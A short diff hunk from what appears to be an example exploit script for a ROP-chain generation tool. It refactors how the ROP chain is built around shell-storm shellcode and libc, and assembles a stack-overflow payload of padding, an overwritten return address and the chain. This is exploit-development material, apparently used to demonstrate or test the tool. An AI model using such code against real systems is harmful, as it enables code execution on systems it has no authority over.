@@ -22,8 +22,8 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
 )
 
 files = [(filename, None, 0)]
-goal_resolver = goal.create_from_arguments(files, ["/lib/x86_64-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(shellcode)]])
-rop = ropme.rop(files, goal_resolver, archinfo.ArchAMD64, logging.CRITICAL)
+libs = ["/lib/x86_64-linux-gnu/libc.so.6"]
+rop = ropme.rop(files, libs, [["shellcode_hex", binascii.hexlify(shellcode)]], log_level = logging.DEBUG)
 
 payload = 'A'*512 + 'B'*8 + rop
 
